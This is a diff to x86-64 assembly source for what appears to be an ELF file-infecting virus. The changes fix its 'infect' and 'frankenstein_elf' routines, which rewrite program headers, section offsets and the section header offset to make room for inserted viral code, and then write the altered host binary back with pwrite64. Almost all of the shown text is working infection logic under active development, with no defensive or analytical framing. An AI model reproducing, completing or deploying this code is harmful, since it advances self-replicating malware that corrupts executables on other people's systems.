@@ -237,7 +237,7 @@ SYS_GETDENTS64	equ 0x4e
 SYS_CREAT		equ 0x55
 
 
-PAGESIZE dd 4096	
+PAGESIZE equ 4096	
 
 
 teststr db 'boo', 13,10,0
@@ -361,6 +361,9 @@ PT_LOAD 	equ 0x1
 PFLAG_R	equ 0x4
 PFLAG_X	equ 0x1
 PFLAG_W	equ 0x2
+
+PFLAGS_RW	equ 0x6
+PFLAGS_RX	equ 0x5
 
 MAX_RDENT_BUF	times 0x800 db 0 
 MAX_RDENT_BUF_SIZE equ 0x800
@@ -757,9 +760,9 @@ infect:
 			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
-				cmp dword [r13 + r12 + elf_phdr.p_flags], (PFLAG_R | PFLAG_X)
+				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RX
 				je .mod_phdr_text_segment			
-				cmp dword [r13 + r12 + elf_phdr.p_flags], (PFLAG_R | PFLAG_W)
+				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RW
 				je .mod_phdr_data_segment			
 				jne .mod_subsequent_phdr
 				.mod_phdr_text_segment:			
@@ -781,11 +784,14 @@ infect:
 					add qword [r13 + r12 + elf_phdr.p_memsz], vlen
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 				.mod_phdr_data_segment:			
-					mov r11d, dword [r13 + r12 + elf_phdr.p_offset]
+					mov r11, [r13 + r12 + elf_phdr.p_offset]
 					mov dword [data_offset_original],  r11d
-					lea r10, [r13 + r12 + elf_phdr.p_offset]
-					mov [DATA_OFFSET_HOST], r10
+					;lea r10, [r13 + r12 + elf_phdr.p_offset]
+					;mov qword [DATA_OFFSET_HOST], r10
 					add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
+					add dword r11d, PAGESIZE
+					lea r10, [r13 + r12 + elf_phdr.p_offset]
+					mov qword [DATA_OFFSET_HOST], r10
 					mov dword [data_offset_new_padding],  r11d
 					;sub r11d, dword [data_offset_original]
 					;mov [data_offset_padding_size], r11d
@@ -796,7 +802,7 @@ infect:
 				mov rdi, STDOUT
 				mov rax, SYS_WRITE
 				syscall
-				add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
+				add qword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
 		.next_phdr:
 			dec cx 
 			add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
@@ -820,12 +826,12 @@ infect:
 	check_shdrs:
 		;push rcx
 		.shdr_loop:
-			mov r10d, dword [r13 + r15 + elf_shdr.sh_offset]
-			cmp r10d, vxoffset
+			mov r10, qword [r13 + r15 + elf_shdr.sh_offset]
+			cmp dword r10d, vxoffset
 			jge .mod_subsequent_shdr
 			mov r11, [r13 + r15 + elf_shdr.sh_addr]
-			add r11d, dword [r13 + r15 + elf_shdr.sh_size]
-			cmp r11d, vxoffset
+			add r11, [r13 + r15 + elf_shdr.sh_size]
+			cmp dword r11d, vxoffset
 			je .mod_curr_shdr
 			jmp .mod_subsequent_shdr
 			.mod_curr_shdr:
@@ -847,9 +853,13 @@ infect:
 	mov r11, qword [r13 + elf_ehdr.e_shoff]
 	mov qword [oshoff], r11
 	cmp dword r11d, vxoffset
-	;jg .patch_ehdr_shoff
-	jl frankenstein_elf
+	jl patch_eshoff
 	jmp fin_infect
+	;jg .patch_ehdr_shoff
+	patch_eshoff:
+		add dword [r13 + elf_ehdr.e_shoff], PAGESIZE
+		jmp frankenstein_elf
+	
 	
 	
 
@@ -1012,12 +1022,14 @@ frankenstein_elf:
 		;add rsi, data_offset_original
 		;add r13, data_offset_original
 		;add r13d, dword [data_offset_original]
+		
 		mov rsi, [DATA_OFFSET_HOST]
+		;mov rsi, DATA_OFFSET_HOST
 			
 		;mov r11, r13
 		;add r11d, data_offset_original
 		;lea rsi, [r11]
-		mov r10d, dword [data_offset_new_padding]
+		mov r10, [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
 		
